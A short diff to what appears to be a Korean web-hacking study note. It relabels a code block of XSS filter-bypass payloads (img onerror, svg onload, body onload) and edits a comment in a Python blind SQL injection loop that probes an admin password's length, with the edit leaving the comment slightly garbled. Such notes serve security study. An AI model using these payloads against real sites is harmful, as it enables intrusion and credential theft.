@@ -91,7 +91,7 @@ Figure 8. HTML Entity Encoding을 통한 우회 예시
 ```
 
 ### Script 필터링 피하기
-```js
+```html
 <img src=about: onerror=alert(document.domain)>
 <svg src=about: onload=alert(document.domain)>
 <body onload=alert(document.domain)>
@@ -239,7 +239,7 @@ pw_len=0
 
 while True:
   pw_len+=1
-  # 문자열 인코딩에 따른 정확한 길이 계산 위해서는 char_length 사용해야 함
+  # 문자열 인코딩에 따른 정확한  계산 위해서는 char_length 사용해야 함
   query = f"admin' and char_length(upw)={pw_len} -- -"
   res = get(f"{url}?uid={query}")
   if "exists" in res.text:
